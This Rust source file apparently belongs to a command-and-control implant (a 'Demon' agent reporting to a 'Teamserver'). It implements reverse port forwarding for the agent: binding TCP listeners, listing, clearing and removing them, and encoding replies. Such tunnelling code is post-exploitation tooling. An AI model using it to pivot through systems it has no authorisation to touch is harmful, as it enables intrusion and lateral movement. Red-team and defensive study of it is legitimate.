use std::net::{Ipv4Addr, SocketAddrV4, TcpListener};

use red_cell_common::demon::{DemonSocketCommand, DemonSocketType};
use tracing::{info, warn};

use super::super::super::socket_io::{
    encode_port_forward_add, encode_socket_clear, encode_u32, parse_u32_le,
};
use super::super::super::types::{ReversePortForward, ReversePortForwardMode};
use super::super::{SocketError, SocketState};

impl SocketState {
    pub(in super::super) fn handle_rportfwd_add(
        &mut self,
        request_id: u32,
        rest: &[u8],
        mode: ReversePortForwardMode,
    ) -> Result<(), SocketError> {
        let mut offset = 0;
        let bind_addr = parse_u32_le(rest, &mut offset)?;
        let bind_port = parse_u32_le(rest, &mut offset)?;
        let forward_addr = parse_u32_le(rest, &mut offset)?;
        let forward_port = parse_u32_le(rest, &mut offset)?;

        let command = match mode {
            ReversePortForwardMode::Teamserver => DemonSocketCommand::ReversePortForwardAdd,
            ReversePortForwardMode::Local => DemonSocketCommand::ReversePortForwardAddLocal,
        };

        let listener_id = self.allocate_socket_id();
        let bind_socket = SocketAddrV4::new(Ipv4Addr::from(bind_addr), bind_port as u16);

        match TcpListener::bind(bind_socket) {
            Ok(listener) => {
                if let Err(e) = listener.set_nonblocking(true) {
                    warn!(error = %e, "failed to set listener non-blocking");
                    self.queue_response(
                        request_id,
                        encode_port_forward_add(
                            command,
                            false,
                            0,
                            bind_addr,
                            bind_port,
                            forward_addr,
                            forward_port,
                        ),
                    );
                    return Ok(());
                }
                let bound_port =
                    listener.local_addr().map(|addr| u32::from(addr.port())).unwrap_or(bind_port);
                info!(
                    listener_id,
                    bind_addr, bound_port, forward_addr, forward_port, "rportfwd added"
                );
                self.reverse_port_forwards.insert(
                    listener_id,
                    ReversePortForward {
                        listener,
                        mode,
                        bind_addr,
                        bind_port: bound_port,
                        forward_addr,
                        forward_port,
                    },
                );
                self.queue_response(
                    request_id,
                    encode_port_forward_add(
                        command,
                        true,
                        listener_id,
                        bind_addr,
                        bound_port,
                        forward_addr,
                        forward_port,
                    ),
                );
            }
            Err(e) => {
                warn!(error = %e, "failed to bind rportfwd listener");
                self.queue_response(
                    request_id,
                    encode_port_forward_add(
                        command,
                        false,
                        0,
                        bind_addr,
                        bind_port,
                        forward_addr,
                        forward_port,
                    ),
                );
            }
        }

        Ok(())
    }

    pub(in super::super) fn handle_rportfwd_list(&mut self, request_id: u32) {
        let mut payload = encode_u32(u32::from(DemonSocketCommand::ReversePortForwardList));
        for (socket_id, listener) in &self.reverse_port_forwards {
            payload.extend_from_slice(&encode_u32(*socket_id));
            payload.extend_from_slice(&encode_u32(listener.bind_addr));
            payload.extend_from_slice(&encode_u32(listener.bind_port));
            payload.extend_from_slice(&encode_u32(listener.forward_addr));
            payload.extend_from_slice(&encode_u32(listener.forward_port));
        }
        self.queue_response(request_id, payload);
    }

    pub(in super::super) fn handle_rportfwd_clear(&mut self, request_id: u32) {
        let listener_ids: Vec<u32> = self.reverse_port_forwards.keys().copied().collect();
        for listener_id in listener_ids {
            self.remove_reverse_port_forward(listener_id);
        }
        let client_ids: Vec<u32> = self
            .sockets
            .iter()
            .filter_map(|(id, s)| (s.socket_type == DemonSocketType::Client).then_some(*id))
            .collect();
        for client_id in client_ids {
            self.remove_socket(client_id);
        }
        self.queue_response(request_id, encode_socket_clear(true));
    }

    pub(in super::super) fn handle_rportfwd_remove(
        &mut self,
        request_id: u32,
        rest: &[u8],
    ) -> Result<(), SocketError> {
        let mut offset = 0;
        let socket_id = parse_u32_le(rest, &mut offset)?;
        if self.reverse_port_forwards.contains_key(&socket_id) {
            let callbacks_before = self.pending_responses.len();
            self.remove_reverse_port_forward(socket_id);
            if let Some(resp) = self.pending_responses.get_mut(callbacks_before) {
                resp.request_id = request_id;
            }
        }
        Ok(())
    }
}
